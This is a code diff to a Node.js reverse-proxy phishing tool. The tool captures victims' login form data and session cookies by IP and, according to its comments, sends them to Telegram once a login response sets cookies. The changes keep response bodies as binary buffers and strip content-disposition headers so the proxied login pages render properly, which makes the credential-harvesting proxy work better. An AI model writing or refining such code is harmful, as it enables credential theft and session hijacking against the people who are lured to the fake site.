@@ -70,7 +70,8 @@ const proxy = createProxyMiddleware({
       body.push(chunk); // Collect response chunks
     });
     proxyRes.on('end', async () => {
-      body = Buffer.concat(body).toString(); // Convert buffer to string
+      body = Buffer.concat(body); // Keep as Buffer for binary data and correct content type handling
+
       const setCookieHeader = proxyRes.headers['set-cookie']; // Get cookies
 
       // Check if we captured data for this IP AND if the response contains cookies
@@ -107,7 +108,21 @@ ${JSON.stringify(loginInfo.allFormData, null, 2)}
              console.log(`[INFO] Captured data for IP ${req.ip}, but no 'set-cookie' header found or target not a login page. Data not sent.`);
         }
       }
-      // Important: Send the original response back to the client
+
+      // --- IMPORTANT: Ensure the browser renders it as a webpage, not a download ---
+      const originalHeaders = proxyRes.headers;
+
+      // Remove headers that might force a download, like 'content-disposition'
+      delete originalHeaders['content-disposition'];
+      // Ensure Content-Type is not forcing download if it's an HTML page
+      // (This might be more complex if the target sends truly binary files,
+      // but for login pages, it's usually fine to let the browser handle standard content types)
+
+      // Set the response headers for the client
+      // Use writeHead to set status code and headers before sending body
+      res.writeHead(proxyRes.statusCode, originalHeaders);
+
+      // Write the response body
       res.end(body);
     });
   },
@@ -129,8 +144,7 @@ app.get('/health', (req, res) => {
 // ENSURE ALL MIDDLEWARE AND PROXY DEFINITIONS ARE ABOVE THIS POINT.
 // The order here is important:
 // 1. Capture data (runs for every request)
-// 2. If data is captured AND it's a login, then send to Telegram (inside onProxyRes)
-// 3. Proxy the request to the target
+// 2. Proxy the request to the target. The onProxyRes logic handles sending to Telegram if a login is detected.
 app.use(captureRequestData); // This must run BEFORE the proxy is used
 app.use('/', proxy);          // This is where the actual proxying happens
 
